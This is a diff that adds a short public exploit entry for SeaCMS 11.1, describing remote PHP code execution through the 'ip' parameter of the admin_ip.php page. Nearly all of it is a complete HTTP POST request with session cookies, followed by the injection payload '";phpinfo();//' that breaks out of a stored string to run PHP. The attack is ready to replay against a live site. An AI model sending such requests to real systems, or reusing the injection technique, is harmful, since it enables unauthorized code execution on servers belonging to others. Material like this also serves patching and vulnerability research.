@@ -1,0 +1,29 @@
+# Exploit Title: Seacms 11.1 - 'ip and weburl' Remote Command Execution
+# Date: 20201212
+# Exploit Author: j5s
+# Vendor Homepage: https://www.seacms.net/
+# Software Link: https://www.seacms.net/
+# Version: 11.1
+
+POST /SeaCMS111/5f9js3/admin_ip.php?action=set HTTP/1.1
+Host: 192.168.137.139
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 36
+Origin: http://192.168.137.139
+Connection: close
+Referer: http://192.168.137.139/SeaCMS111/5f9js3/admin_ip.php
+Cookie: more=1; Hm_lvt_22c4c422b3e7b17729ce8b5817d54592=1607175396;
+PHPSESSID=t1gc019b35rrgmr1dg53gfje96;
+t00ls=e54285de394c4207cd521213cebab040;
+t00ls_s=YTozOntzOjQ6InVzZXIiO3M6MzoicGhwIjtzOjM6ImFsbCI7aTowO3M6MzoiaHRhIjtpOjE7fQ%3D%3D
+Upgrade-Insecure-Requests: 1
+
+v=0&ip=+%22%3Bphpinfo%28%29%3B%2F%2F
+
+Vulnerable parameters：ip
+
+payload：";phpinfo();//
